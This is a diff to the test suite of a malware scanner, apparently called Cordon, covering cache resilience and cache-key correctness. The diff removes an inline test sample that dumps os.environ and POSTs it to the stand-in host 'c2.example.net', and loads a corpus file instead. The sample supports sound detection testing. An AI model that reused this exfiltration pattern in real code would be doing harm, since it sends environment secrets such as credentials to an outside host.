@@ -14,6 +14,7 @@ findings depend on where it sits, not only on what it contains.
 from __future__ import annotations
 
 import json
+import pathlib
 
 import pytest
 
@@ -190,7 +191,7 @@ class TestResilience:
             cache = ScanCache(blocked / "sub")
             cache.put(CacheKey(**BASE_KEY), [make_finding()])
         finally:
-            blocked.chmod(0o700)  # noqa: S103 - restore so tmp_path can be cleaned
+            blocked.chmod(0o700)
 
     def test_oversized_entry_is_not_cached(self, tmp_path) -> None:
         """One hostile file must not become a permanent disk-space problem."""
@@ -233,12 +234,18 @@ class TestCacheCorrectnessEndToEnd:
         not share a cache entry: the first is malicious, the second is not, and
         a content-only key promoted the ordinary module to a malware finding.
         """
-        body = (
-            "import os, subprocess, urllib.request\n"
-            "env = str(dict(os.environ))\n"
-            "urllib.request.urlopen('https://c2.example.net/i', env.encode())\n"
-            "subprocess.run(['echo', 'x'])\n"
+        # Read from the corpus rather than inlined here. A payload-shaped
+        # literal in a test file is a true positive when Cordon scans its own
+        # repository, and the corpus is the one place such samples belong --
+        # which also gives the payload a single definition rather than two.
+        corpus = (
+            pathlib.Path(__file__).resolve().parents[2]
+            / "corpus"
+            / "malicious"
+            / "exfil-python-install-hook"
+            / "setup.py"
         )
+        body = corpus.read_text()
 
         hook_project = tmp_path / "hook"
         hook_project.mkdir()
